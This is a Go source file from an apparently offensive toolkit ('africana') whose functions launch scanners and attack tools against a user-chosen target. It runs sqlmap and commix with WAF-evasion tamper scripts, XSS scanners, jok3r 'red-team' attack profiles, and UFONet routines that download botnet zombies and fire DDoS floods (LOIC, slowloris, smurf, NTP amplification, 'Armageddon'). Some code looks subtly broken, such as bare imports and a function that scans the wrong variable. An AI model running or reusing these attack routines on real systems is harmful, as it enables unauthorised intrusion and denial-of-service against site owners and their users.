package webattackers

import (
    "os"
    "fmt"
    "bufio"
    "time"
    "strings"
    "bcolors"
    "subprocess"
)

var (
 userInput    string
 userPort     string
 userTarget   string
 chosenTarget string
)

func WafW00f(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing full waf detection on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/wafw00f_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'wafw00f -v -a %s' -O %s`, userTarget, Logs)
    //fmt.Println()
}

func DnsRecon(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing full dns recon scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/dnsrecon_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'dnsrecon -a -d %s' -O %s`, userTarget, Logs)
    //fmt.Println()
}

func SeekOlver(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing full recon second fase scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/seekolver_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/seekolver/; python3 seekolver.py -v -r -k -cn -p 80 443 -te %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func WhatWeb(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing full softs scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/whatweb_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'whatweb -a 3 -v %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func Harvester(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing emails Harvesting on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/theHarvester_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'theHarvester -n -l 45 -b bing,yahoo,duckduckgo -r "1.1.1.1" -d %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func ParamSpider(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing full urls mine on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/paramspider_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'paramspider -s -d %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func SslScan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing full ssl vuln scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/sslscan_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'sslscan --show-certificate --show-sigs --tlsall --verbose %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func Gobuster(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing full content discovery on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/gobuster_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'gobuster dir vhost --debug --no-error --random-agent -w /root/.africana/africana-base/wordlists/content/big.txt -e -u %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func Nuclei(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing full known vuln scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nuclei_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'nuclei -u %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func Nikto(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing full deep vuln scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nikto_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'nikto -ask no -Cgidirs all -Display 3 -host %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func Bbot(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing full vuln recon scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/bbot_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'bbot -y -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly -t %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func Uniscan(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing heavy vuln recon scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/uniscan_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'uniscan -qweds -u %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func SqlmapAuto(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Launched automated sql recon scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/sqlmapA_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -u %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func SqlmapMan() {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Launched manual sql recon scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/sqlmapM_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenTwo(`script -q -c 'sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -wizard' -O %s`, Logs)
}

func CommixAuto(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Launched auto command injection scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/commixA_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=5 -u %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func CommixMan() {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Launched manual command injection scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/commixM_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenTwo(`script -q -c 'commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=5 --wizard' -O %s`, Logs)
}

func KatanaAuto(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing heavy xss vuln recon scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/katana_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'katana -jc -kf all -c 5 -d 3 %s | httpx-toolkit -silent -follow-redirects -random-agent -status-code -threads 5 | dalfox pipe --only-poc r --ignore-return 302,404,403 --skip-bav' -O %s`, userTarget, Logs)
    fmt.Println()
}

func XsserAuto(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing auto xss vuln recon scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/xsserA_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'xsser -c 100 --Cl -u %s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func XsserMan() {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Launched manual xss vuln recon scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/xsserM_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenTwo(`script -q -c 'xsser -u --wizard' -O %s`, Logs)
}

func NetTacker1(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing port & wappalyzer recon scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nettacker1_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -m port_scan -t 100 -i %s ' -O %s`, userTarget, Logs)
    fmt.Println()
}

func NetTacker2(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing subdomains recon scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nettacker2_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m subdomain_scan' -O %s`, userTarget, Logs)
    fmt.Println()
}

func NetTacker3(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing admin_panel finder scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nettacker3_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m scan' -O %s`, userTarget, Logs)
    fmt.Println()
}

func NetTacker4(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing passive info gathering scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nettacker4_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m information_gathering -s' -O %s`, userTarget, Logs)
    fmt.Println()
}

func NetTacker5(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC +  "+" + bcolors.BLUE + "] " + bcolors.GREEN + "Performing vulnscansecurity checks scan on Target:" + bcolors.BLUE + "(" + bcolors.YELLOW + "%s" , userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nettacker5_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m server_version_vuln' -O %s`, userTarget, Logs)
    fmt.Println()
}

func NetTacker6(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Runing CVE scans on the Target:" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nettacker6_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m cve' -O %s`, userTarget, Logs)
    fmt.Println()
}

func NetTacker7(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Searching for (critical vulns & exploit)" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nettacker7_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s -m high_severity' -O %s`, userTarget, Logs)
    fmt.Println()
}

func NetTacker8(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched automated & intrusive checks" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nettacker8_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenThree(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py -i %s --profile all/results.txt' -O %s`, userTarget, Logs)
    fmt.Println()
}

func NetTacker9() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched WebUI key: africana" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    Logs := fmt.Sprintf("/root/.africana/logs/nettacker9_log_%s.txt", time.Now().Format("20060102_150405"))
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/nettacker/; python3 nettacker.py --start-api --api-access-key africana', -O %s`, Logs)
}

func Jok3r1() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Installing all jok3r tools. Pleas start be patient" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; /bin/bash install-all.sh`)
}

func Jok3r2() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Updating all the tools in the toolbox. Pleas start be patient" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py toolbox --update-all --auto`)
}

func Jok3r3() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Showing all the tools in the toolbox" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py toolbox --show-all`)
}

func Jok3r4() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Showing supported products for all services" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py info --services`)
}

func Jok3r5(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Performing a very fast-scan on" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast`, userTarget)
    fmt.Println()
}

func Jok3r6(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Run all security checks against" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, userTarget)
    fmt.Println()
}

func Jok3r7(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Searching for critical vulns & easy to exploit" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, userTarget)
    fmt.Println()
}

func Jok3r8() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Showing the full results from the security checks" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -`)
}

func Jok3r9() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Clean & interact with DB Commands; help or quit 2 exit." + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/jok3r/; python3 jok3r.py db "mission -d default"`)
}

func Osmedeus1() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Updating Osmedeus & Runing diagnostics to check config." + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`osmedeus version --json; osmedeus update; osmedeus update --vuln; osmedeus update --force --clean`)
}

func Osmedeus2(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Started simple scan with other flow on" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus --nv scan -t %s`, userTarget)
    fmt.Println()
}

func Osmedeus3(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Started Directly run on vuln scan & directory scan on" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus --nv scan -f vuln-and-dirb -t %s`, userTarget)
    fmt.Println()
}

func Osmedeus4(userTargets string) {
    fmt.Println(bcolors.ENDC + "\n               (" + bcolors.UNDERL + bcolors.BLUE + "Give full path for your .urls" + bcolors.ENDC + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n" + bcolors.YELLOW + `¯\_(ツ)_/¯ ` + bcolors.BLUE + "Path to target🎯 " + bcolors.GREEN + "Urls to be " + bcolors.RED + "Attacked!! \n" + bcolors.ENDC)
    fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.GREEN + ")# " + bcolors.ENDC)
    fmt.Scan(&userTargets)
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Started bulk scan on" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus scan -f vuln-and-dirb -T %s`, userTarget)
}

func Osmedeus5(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched Cloud - Run scan in Distributed Cloud mode" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus health cloud; osmedeus cloud --chunk -c 5 -t %s`, userTarget)
    fmt.Println()
}

func Osmedeus6(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Performing Full web vuln & secret scan on" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus scan --tactic aggressive --nv -f vuln-and-dirb -t %s`, userTarget)
    fmt.Println()
}

func Osmedeus7(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Update the vulnerability database before attacking" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus scan --update-vuln -t %s`, userTarget)
    fmt.Println()
}

func Osmedeus8() {
    fmt.Printf(bcolors.BLUE + "( " + bcolors.RED + "Select a Port to start your server on" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Print(bcolors.GREEN + "\n(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" + bcolors.ENDC + ":" + bcolors.GREEN + "(" + bcolors.RED + "Port:" + bcolors.BLUE + "Default:" + bcolors.BLUE + "3333" + bcolors.GREEN + ")# " + bcolors.ENDC)
    reader := bufio.NewReader(os.Stdin)
    userPort, _ := reader.ReadString('\n')
    userPort = strings.TrimSpace(userPort)
    if userPort == "" {
        userPort = "3333"
    }
    fmt.Printf(bcolors.BLUE + "\n( " + bcolors.RED + "Started Osmedeusweb UI server on " + bcolors.GREEN + "localhost:%s", userPort + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus server --port `, userPort)
}

func Osmedeus9() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Showing scanned osmedeus report list" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`osmedeus report list`)
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.UNDERL + bcolors.BLUE + " Pleas select a target to expand list " + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework" +  bcolors.GREEN + ")# " + bcolors.ENDC)
    fmt.Scan(&chosenTarget)
    fmt.Printf(bcolors.RED + "\n(More results for = %s)", chosenTarget + bcolors.ENDC)
    subprocess.PopenTwo(`osmedeus report view --static -t %s`, chosenTarget)
}

func Ufonet1() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Downloading list of bots from C.S" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet --download-zombies`)
}

func Ufonet2() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Testing If bots are alive" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -t botnet/zombies.txt`)
}

func Ufonet3(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched Palantir 3.14 againist" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"`, userTarget)
    fmt.Println()
}

func Ufonet4(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched Socking_waves (instant-knockout!) againist" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"`, userTarget)
    fmt.Println()
}

func Ufonet5(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched xcom-1 (only DDoS) againist" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`script -q -c 'cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"`, userTarget)
    fmt.Println()
}

func Ufonet6(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched xcom-2 (only DoS) againist" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, userTarget)
    fmt.Println()
}

func Ufonet7() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched ufonet gui on http://localhost:9999" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet --gui`)
}

func Ufonet8() {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Started Grider python3 ufonet --grider &" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    subprocess.Popen(`cd /root/.africana/africana-base/ufonet/; python3 ufonet --grider`)
}

func Ufonet9(userTarget string) {
    fmt.Printf(bcolors.BLUE + "\n(" + bcolors.GREEN + "Launched Armageddon! with ALL!" + bcolors.BLUE + ")" + bcolors.BLUE + " ~> " + bcolors.BLUE + "(" + bcolors.YELLOW + "%s", userTarget + bcolors.BLUE + "🎯)\n" + bcolors.ENDC)
    subprocess.PopenTwo(`cd /root/.africana/africana-base/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, userTarget)
    fmt.Println()
}
